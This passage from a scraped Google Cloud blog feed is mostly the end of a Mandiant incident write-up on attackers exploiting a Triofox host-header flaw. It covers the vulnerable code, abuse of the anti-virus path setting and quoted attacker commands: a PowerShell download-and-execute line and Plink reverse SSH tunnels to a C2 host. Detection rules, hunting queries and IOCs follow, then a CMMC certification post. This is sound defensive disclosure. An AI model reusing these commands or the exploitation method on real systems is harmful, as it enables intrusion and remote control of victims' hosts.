baseline;\">AdminDatabase.aspx</code><span style=\"vertical-align: baseline;\"> page, access is granted to the admin initialization page, </span><code style=\"vertical-align: baseline;\">AdminAccount.aspx</code><span style=\"vertical-align: baseline;\">, which then redirects to the </span><code style=\"vertical-align: baseline;\">InitAccount.aspx</code><span style=\"vertical-align: baseline;\"> page to create a new admin account.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Successful access to the AdminCreation page InitAccount.aspx\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig6.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 6: Successful access to the AdminCreation page InitAccount.aspx</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Admin page\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig7a.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 7: Admin page</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Analysis of the code base revealed that the main access control check to the </span><code style=\"vertical-align: baseline;\">AdminDatabase.aspx</code><span style=\"vertical-align: baseline;\"> page is controlled by the function </span><code style=\"vertical-align: baseline;\">CanRunCrticalPage()</code><span style=\"vertical-align: baseline;\">,  located within the </span><code style=\"vertical-align: baseline;\">GladPageUILib.GladBasePage</code><span style=\"vertical-align: baseline;\"> class found in </span><code style=\"vertical-align: baseline;\">C:\\Program Files (x86)\\Triofox\\portal\\bin\\GladPageUILib.dll</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>public bool CanRunCriticalPage()\n{\n    Uri url = base.Request.Url;\n    string host = url.Host;\n    bool flag = string.Compare(host, \"localhost\", true) == 0; //Access to the page is granted if Request.Url.Host equals 'localhost', immediately skipping all other checks if true\n\n    bool result;\n    if (flag)\n    {\n        result = true;\n    }\n    else\n    {\n       //Check for a pre-configured trusted IP in the web.config file. If configured, compare the client IP with the trusted IP to grant access\n \nstring text = ConfigurationManager.AppSettings[\"TrustedHostIp\"];\n        bool flag2 = string.IsNullOrEmpty(text);\n        if (flag2)\n        {\n            result = false;\n        }\n        else\n        {\n            string ipaddress = this.GetIPAddress();\n            bool flag3 = string.IsNullOrEmpty(ipaddress);\n            if (flag3)\n            {\n                result = false;\n            }\n            else\n            ...\n           </code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 8: Vulnerable code in the function <code>CanRunCrticalPage()</code></span> </p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">As noted in the code snippet, the code presents several vulnerabilities:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Host Header attack - ASP.NET builds </span><code style=\"vertical-align: baseline;\">Request.Url</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">from the HTTP Host header, which can be modified by an attacker.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">No Origin Validation - No check for whether the request came from an actual </span><code style=\"vertical-align: baseline;\">localhost</code><span style=\"vertical-align: baseline;\"> connection versus a spoofed header.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Configuration Dependence - If </span><code style=\"vertical-align: baseline;\">TrustedHostIP</code><span style=\"vertical-align: baseline;\"> isn't configured, the only protection is the Host header check.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Triofox Anti-Virus Feature Abuse</span></h3>\n<p><span style=\"vertical-align: baseline;\">To achieve code execution, the attacker logged in using the newly created Admin account. The attacker uploaded malicious files to execute them using the built-in anti-virus feature. To set up the anti-virus feature, the user is allowed to provide an arbitrary path for the selected anti-virus. The file configured as the anti-virus scanner location inherits the Triofox parent process account privileges, running under the context of the SYSTEM account.</span></p>\n<p><span style=\"vertical-align: baseline;\">The attacker was able to run their malicious batch script by configuring the path of the anti-virus engine to point to their script. The folder path on disk of any shared folder is displayed when publishing a new share within the Triofox application. Then, by uploading an arbitrary file to any published share within the Triofox instance, the configured script will be executed.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Anti-virus engine path set to a malicious batch script\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig9.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 9: Anti-virus engine path set to a malicious batch script</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">SecOps telemetry recorded the following command-line execution of the attacker script:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>C:\\Windows\\system32\\cmd.exe /c \"\"c:\\triofox\\centre_report.bat\" C:\\Windows\\TEMP\\eset_temp\\ESET638946159761752413.av\"</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Post-Exploitation Activity</span></h3></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Overview of the post-exploitation activity\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/triofox-vulnerability-fig10a.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 10: Overview of the post-exploitation activity</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Support Tools Deployment</span></h4>\n<p><span style=\"vertical-align: baseline;\">The attacker script </span><code style=\"vertical-align: baseline;\">centre_report.bat</code><span style=\"vertical-align: baseline;\"> executed the following PowerShell command to download and execute a second-stage payload:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>powershell -NoProfile -ExecutionPolicy Bypass -Command \"$url = 'http://84.200.80[.]252/SAgentInstaller_16.7.10368.56560.zip'; $out = 'C:\\\\Windows\\appcompat\\SAgentInstaller_16.7.10368.56560.exe'; Invoke-WebRequest -Uri $url -OutFile $out; Start-Process $out -ArgumentList '/silent' -Wait\"</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The PowerShell downloader was designed to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Download a payload from </span><code style=\"vertical-align: baseline;\">http://84.200.80[.]252/SAgentInstaller_16.7.10368.56560.zip</code><span style=\"vertical-align: baseline;\">, which hosted a disguised executable despite the ZIP extension</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Save the payload to: </span><code style=\"vertical-align: baseline;\">C:\\Windows\\appcompat\\SAgentInstaller_16.7.10368.56560.exe</code></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Execute the payload silently</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The executed payload was a legitimate copy of the Zoho Unified Endpoint Management System (UEMS) software installer. The attacker used the UEMS agent to then deploy the Zoho Assist and Anydesk remote access utilities on the host.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Reconnaissance and Privilege Escalation</span></h4>\n<p><span style=\"vertical-align: baseline;\">The attacker used Zoho Assist to run various commands to enumerate active SMB sessions and specific local and domain user information. </span></p>\n<p><span style=\"vertical-align: baseline;\">Additionally, they attempted to change passwords for existing accounts and add the accounts to the local administrators and the “Domain Admins” group.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Defense Evasion</span></h4>\n<p><span style=\"vertical-align: baseline;\">The attacker downloaded </span><code style=\"vertical-align: baseline;\">sihosts.exe</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">silcon.exe</code><span style=\"vertical-align: baseline;\"> (sourced from the legitimate domain </span><code style=\"vertical-align: baseline;\">the.earth[.]li</code><span style=\"vertical-align: baseline;\">) into the directory </span><code style=\"vertical-align: baseline;\">C:\\windows\\temp\\</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; width: 100%;\"><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Filename </strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Original Filename</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">sihosts.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">Plink (PuTTY Link)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">A common command-line utility for creating SSH connections</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">silcon.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">PuTTY</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">A SSH and telnet client</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">These tools were used to set up an encrypted tunnel, connecting the compromised host to their command-and-control (C2 or C&amp;C) server over port </span><code style=\"vertical-align: baseline;\">433</code><span style=\"vertical-align: baseline;\"> via SSH. The C2 server could then forward all traffic over the tunnel to the compromised host on port 3389, allowing inbound RDP traffic. The commands were run with the following parameters:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>C:\\windows\\temp\\sihosts.exe -batch -hostkey \"ssh-rsa 2048 SHA256:&lt;REDACTED&gt;\" -ssh -P 433 -l &lt;REDACTED&gt; -pw &lt;REDACTED&gt; -R 216.107.136[.]46:17400:127.0.0.1:3389 216.107.136[.]46\n\nC:\\windows\\temp\\silcon.exe  -ssh -P 433 -l &lt;REDACTED&gt; -pw &lt;REDACTED&gt;-R 216.107.136[.]46:17400:127.0.0.1:3389 216.107.136[.]46</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Conclusion</span></h3>\n<p><span style=\"vertical-align: baseline;\">While this vulnerability is patched in the Triofox version </span><code style=\"vertical-align: baseline;\">16.7.10368.56560</code><span style=\"vertical-align: baseline;\">, Mandiant recommends upgrading to the latest release. In addition, Mandiant recommends auditing admin accounts, and verifying that Triofox’s Anti-virus Engine is not configured to execute unauthorized scripts or binaries. Security teams should also hunt for attacker tools using our hunting queries listed at the bottom of this post, and monitor for anomalous outbound SSH traffic. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Acknowledgements</span></h3>\n<p><span style=\"vertical-align: baseline;\">Special thanks to Elvis Miezitis, Chris Pickett, Moritz Raabe, Angelo Del Rosario, and Lampros Noutsos</span></p>\n<h3><span style=\"vertical-align: baseline;\">Detection Through Google SecOps</span></h3>\n<p><span style=\"vertical-align: baseline;\">Google SecOps customers have access to these broad category rules and more under the </span><code style=\"vertical-align: baseline;\">Mandiant Windows Threats</code> <span style=\"vertical-align: baseline;\">rule pack. The activity discussed in the blog post is detected in Google SecOps under the rule names:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Gladinet or Triofox IIS Worker Spawns CMD</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Gladinet or Triofox Suspicious File or Directory Activity</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Gladinet Cloudmonitor Launches Suspicious Child Process</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Powershell Download and Execute</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">File Writes To AppCompat</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Renamed Anydesk Install</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Activity In Triofox Directory</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious Execution From Appcompat</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">RDP Protocol Over SSH Reverse Tunnel Methodology</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Plink EXE Tunneler</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Net User Domain Enumeration</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">SecOps Hunting Queries</span></h3>\n<p><span style=\"vertical-align: baseline;\">The following UDM queries can be used to identify potential compromises within your environment.</span></p>\n<h4><span style=\"vertical-align: baseline;\">GladinetCloudMonitor.exe Spawns Windows Command Shell</span></h4>\n<p><span style=\"vertical-align: baseline;\">Identify the legitimate GladinetCloudMonitor.exe process spawning a Windows Command Shell.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>metadata.event_type = \"PROCESS_LAUNCH\"\nprincipal.process.file.full_path = /GladinetCloudMonitor\\.exe/ nocase\ntarget.process.file.full_path = /cmd\\.exe/ nocase</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Utility Execution</span></h4>\n<p><span style=\"vertical-align: baseline;\">Identify the execution of a renamed Plink executable (sihosts.exe) or a renamed PuTTy executable (silcon.exe) attempting to establish a reverse SSH tunnel.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>metadata.event_type = \"PROCESS_LAUNCH\"\ntarget.process.command_line = /-R\\b/\n(\ntarget.process.file.full_path = /(silcon\\.exe|sihosts\\.exe)/ nocase or\n(target.process.file.sha256 = \"50479953865b30775056441b10fdcb984126ba4f98af4f64756902a807b453e7\" and target.process.file.full_path != /plink\\.exe/ nocase) or\n(target.process.file.sha256 = \"16cbe40fb24ce2d422afddb5a90a5801ced32ef52c22c2fc77b25a90837f28ad\" and target.process.file.full_path != /putty\\.exe/ nocase)\n)</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Indicators of Compromise (IOCs)</span></h3>\n<p><span style=\"vertical-align: baseline;\">The following <a href=\"https://www.virustotal.com/gui/collection/24c5c9845cff98045866db50c979374b912c0466abcb2b9e20a166fa407eba04\" rel=\"noopener\" target=\"_blank\">IOCs are available in a Google Threat Intelligence (GTI) collection</a> for registered users.</span></p>\n<p><span style=\"vertical-align: baseline;\">Note: The following table contains artifacts that are renamed instances of legitimate tools.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Host-Based Artifacts</span></h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Artifact</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">SHA-256 Hash</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Windows\\appcompat\\SAgentInstaller_16.7.10368.56560.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Installer containing Zoho UEMS Agent</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">43c455274d41e58132be7f66139566a941190ceba46082eb2ad7a6a261bfd63f</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Windows\\temp\\sihosts.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Plink</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">50479953865b30775056441b10fdcb984126ba4f98af4f64756902a807b453e7</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Windows\\temp\\silcon.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">PuTTy</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">16cbe40fb24ce2d422afddb5a90a5801ced32ef52c22c2fc77b25a90837f28ad</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Windows\\temp\\file.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">AnyDesk</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">ac7f226bdf1c6750afa6a03da2b483eee2ef02cd9c2d6af71ea7c6a9a4eace2f</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\triofox\\centre_report.bat</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Attacker batch script filename</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">N/A</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Network-Based Artifacts</span></h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">IP Address</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">ASN</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">85.239.63[.]37</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">AS62240 - Clouvider Limited</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">IP address of the attacker used to initially exploit CVE-2025-12480 to create the admin account and gain access to the Triofox instance</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">65.109.204[.]197</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">AS24950 - Hetzner Online GmbH</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">After a dormant period, the threat actor used this IP address to login back into the Triofox instance and carry out subsequent activities</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">84.200.80[.]252</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">AS214036 - Ultahost, Inc.</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">IP address hosting the installer for the Zoho UEMSAgent remote access tool</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">216.107.136[.]46</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">AS396356 - LATITUDE-SH</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Plink C2</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>",
        "published_date": "2025-11-10 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/public-sector/securing-the-mission-google-public-sectors-cmmc-level-2-certification-and-commitment-to-national-security/",
        "title": "Securing the mission: Google Public Sector’s CMMC Level 2 certification and commitment to national security",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/PS_Copy_of_Blog_Headers_-_Cloudstyle_3.0_18.max-600x600.png",
        "author": "Ron Bushar",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>Google Public Sector is committed to supporting the critical missions of the U.S. Department of Defense (DoD) by delivering cutting-edge cloud, AI, and data services securely. Today, we are marking an important milestone in that commitment: we have successfully achieved Cybersecurity Maturity Model Certification (CMMC) Level 2 certification under the DoD’s CMMC program.</p><p>This certification, validated by a certified third-party assessment organization (C3PAO), affirms that Google Public Sector’s internal systems used to handle Controlled Unclassified Information (CUI) meet the DoD’s rigorous cybersecurity standards for protecting CUI.</p><h3><b>Enabling a secure partnership</b></h3><p>This CMMC Level 2 certification is a key enabler for our partnership with the DoD. It ensures our teams can operate and collaborate within the defense ecosystem fully supporting the new DoD requirements, allowing us to serve as a trusted partner and support the mission without compromise.</p><h3><b>Helping the Defense Industrial Base on their CMMC journey</b></h3><p>While this certification does not extend to customer environments, we are also dedicated to helping our partners and customers across the Defense Industrial Base (DIB) on their <i>own</i> CMMC journeys.</p><p>Our FedRAMP-authorized cloud services, including Google Workspace, are designed to support DIB suppliers in building their CMMC-compliant solutions with secure, cutting-edge cloud, AI, and data capabilities. You can find all of our compliance resources, including guides for both Google Cloud and Google Workspace, on our central<a href=\"https://cloud.google.com/security/compliance/cmmc\"> CMMC compliance page</a>. As an example, our<a href=\"https://services.google.com/fh/files/helpcenter/gws_implementation_guide_for_cmmc.pdf\" target=\"_blank\"> Google Workspace CMMC Implementation Guide</a> provides specific configuration details and control mappings and our recent blog details how <a href=\"https://workspace.google.com/blog/identity-and-security/checkboxes-checkmates-how-google-workspace-can-help-you-achieve-cmmc-20-compliance?e=48754805\" target=\"_blank\">Google Workspace can help you achieve CMMC 2.0 compliance</a>. These resources are designed to help DIB companies accelerate their own assessments and build their CMMC-compliant solutions on a secure, verified foundation.</p><h3><b>Understanding CMMC and the DFARS connection</b></h3><p>The CMMC program is a DoD initiative to enhance cybersecurity across the DIB. Its purpose is to verify that contractors have implemented the required security controls, based heavily on NIST Special Publication (SP) 800-171, to protect CUI and Federal Contract Information (FCI).</p><p>Many contractors are already familiar with DFARS 252.204-7012, which has long required the implementation of NIST SP 800-171. The new CMMC program is being implemented into contracts via the clause DFARS 252.204-7021. When this clause appears in a solicitation, it makes having achieved a specific CMMC level a mandatory condition for contract award.</p><h3><b>A continued commitment to the mission</b></h3><p>Our CMMC Level 2 certification is a direct reflection of our commitment to meeting the DoD's stringent security requirements. It ensures we can continue to support the Department’s mission responsibly and compliantly. We remain committed to our partnership with the DoD, empowering the Defense Industrial Base with cutting-edge cloud, AI, and data services to build a more secure and resilient future.</p><p>Catch the highlights from our recent <a href=\"https://cloudonair.withgoogle.com/events/public-sector-summit-2025\" target=\"_blank\">Google Public Sector Summit</a> where we shared how Google Cloud’s AI and security technologies can help advance your mission.</p></div>",
        "published_date": "2025-11-10 13:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
        "title": "What’s new with Google Cloud",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/original_images/whts_new_2025_5V6FQkI.jpg",
        "author": "Google Cloud Content & Editorial",
        "track": null,
